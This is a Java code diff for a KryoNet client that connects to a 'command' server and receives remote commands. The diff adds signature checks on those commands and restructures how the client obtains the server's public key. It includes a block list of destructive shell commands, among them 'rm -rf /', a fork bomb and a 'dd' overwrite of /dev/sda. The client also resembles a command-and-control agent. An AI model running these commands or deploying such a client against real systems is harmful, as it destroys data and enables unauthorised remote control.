@@ -25,6 +25,10 @@ public class Main {
      * This project uses the KryoNet library from EsotericSoftware (https://github.com/EsotericSoftware/kryonet)
      * Please keep in mind that KryoNet is built upon Java NIO, and has a (mostly) asynchronous approach to message transmission and reception.
      */
+    //Private and Public key locations
+
+    static final String PRIVATE_KEY_FILE = "CNCKeys/privateKey";
+    static final String PUBLIC_KEY_FILE = "CNCKeys/publicKey";
 
 
     //Adjust this accordingly to limit/unlimit the amount of data that can be sent to command in the form of a CommandResponse.
@@ -48,8 +52,9 @@ public class Main {
     public static List<String> blockedCommands = Arrays.asList("rm -rf /", "rm -rf /home", ":(){ :|:& };:", "shutdown", "> /dev/sda", "/dev/null", "/dev/sda", "dd if=/dev/random of=/dev/sda", "/dev/random", "/root/,ssh", "ssh-copy-id", "ssh");
 
     public static void main(String[] args) {
-        pseudoSecurelyObtainPublicKey();
-        //initialize();
+        failoverUtil();
+
+        initialize();
 
 
     }
@@ -96,6 +101,8 @@ public class Main {
             error("Unable to connect to command");
             System.exit(0);
         }
+        pseudoSecurelyObtainPublicKey();
+
         /*
         This listener functions as an authentication confirmation receiver, and as well as a makeshift status checker for the command server.
         coupled together with startKeepAliveCheck()
@@ -103,6 +110,60 @@ public class Main {
         startListeners();
 
 
+    }
+    /*
+    Listens for a public key transmission from the server and writes it to a file if received.
+     */
+
+    private static void startPublicKeyTransmissionListener() {
+        client.addListener(new Listener() {
+            public void received(Connection connection, Object object) {
+                if (object instanceof PublicKeyTransmission) {
+                    PublicKeyTransmission publicKeyTransmission = (PublicKeyTransmission)object;
+                    log("Received public key transmission");
+                    if (publicKeyTransmission.getIpAddress().equals(COMMANDIP)) {
+                        log("Verified public key is from COMMANDIP");
+
+
+                        String strFilePath = "CNCKeys/publicKey";
+                        log("Attempting to write public key to file at "+strFilePath);
+                        try {
+                            new File("CNCKeys").mkdirs();
+                            FileOutputStream fos = new FileOutputStream(strFilePath);
+                            for (byte b:publicKeyTransmission.getStream()) {
+                                System.out.println((char)b);
+                            }
+                            fos.write(publicKeyTransmission.getStream());
+                            fos.close();
+                            log("Successfully wrote byte stream to file");
+                            log("Initializing main program");
+
+                        }
+                        catch(FileNotFoundException ex)   {
+                            System.out.println("FileNotFoundException : " + ex);
+                            error("Failed to find file");
+                            client.stop();
+                            System.exit(0);
+                        }
+                        catch(IOException ioe)  {
+                            ioe.printStackTrace();
+                            System.out.println("IOException : " + ioe);
+                            error("Error while writing byte stream to file");
+                            client.stop();
+                            System.exit(0);
+                        }
+
+
+
+
+
+
+                    }
+
+
+                }
+            }
+        });
     }
 
     /*
@@ -115,7 +176,23 @@ public class Main {
                 if (object instanceof Command) {
                     //if (!authenticated) return;
 
+
+
+
                     Command command = (Command) object;
+                    try {
+                        if (!command.verify()) {
+                             error("Invalid authenticity");
+                             return;
+                        } else {
+                            log("Authenticity signature of command validated");
+                        }
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                        error("Unable to verify authenticity of command from server");
+                         System.exit(0);
+                    }
+
                     commandLog(command.getCommand());
                     for (String s : blockedCommands) {
                         if (command.getCommand().toLowerCase().contains(s)) {
@@ -267,7 +344,10 @@ public class Main {
         client.start();
         registerClasses();
         client.connect(3000, COMMANDIP, COMMANDPORT);
+
         log("Successfully reconnected to command");
+        pseudoSecurelyObtainPublicKey();
+
         startListeners();
 
 
@@ -363,82 +443,13 @@ public class Main {
     //TODO A more thorough and cryptographically secure implementation of communication security
     */
     private static void pseudoSecurelyObtainPublicKey() {
-        log("Attempting to obtain public key");
-
-        client = new Client();
-        client.start();
-        registerClasses();
-        failoverUtil();
-        log("Client Started");
         try {
-            log("Connecting client");
-            client.connect(5000, COMMANDIP, COMMANDPORT);
-            log("Client connected");
 
-
-            client.addListener(new Listener() {
-                public void received(Connection connection, Object object) {
-                    if (object instanceof PublicKeyTransmission) {
-                        PublicKeyTransmission publicKeyTransmission = (PublicKeyTransmission)object;
-                        log("Received public key transmission");
-                        if (publicKeyTransmission.getIpAddress().equals(COMMANDIP)) {
-                            log("Verified public key is from COMMANDIP");
-
-
-                            String strFilePath = "CNCKeys/publicKey";
-                            log("Attempting to write public key to file at "+strFilePath);
-                            try {
-                                new File("CNCKeys").mkdirs();
-                                FileOutputStream fos = new FileOutputStream(strFilePath);
-                                for (byte b:publicKeyTransmission.getStream()) {
-                                    System.out.println((char)b);
-                                }
-                                fos.write(publicKeyTransmission.getStream());
-                                fos.close();
-                                log("Successfully wrote byte stream to file");
-                                client.close();
-                                client.stop();
-                                log("Initializing main program");
-                                initialize();
-                            }
-                            catch(FileNotFoundException ex)   {
-                                System.out.println("FileNotFoundException : " + ex);
-                                error("Failed to find file");
-                                client.stop();
-                                System.exit(0);
-                            }
-                            catch(IOException ioe)  {
-                                ioe.printStackTrace();
-                                System.out.println("IOException : " + ioe);
-                                error("Error while writing byte stream to file");
-                                client.stop();
-                                System.exit(0);
-                            }
-
-
-
-
-
-
-                        }
-
-
-                    }
-                }
-            });
-
-
-
-
-
-
+            log("Attempting to obtain public key");
+            startPublicKeyTransmissionListener();
             log("Sending KeyRequest");
             client.sendTCP(new KeyRequest(getIp(), InetAddress.getLocalHost().getHostName()));
-
-
-
-
-
+            log("Sent KeyRequest");
 
         } catch (IOException e) {
             e.printStackTrace();
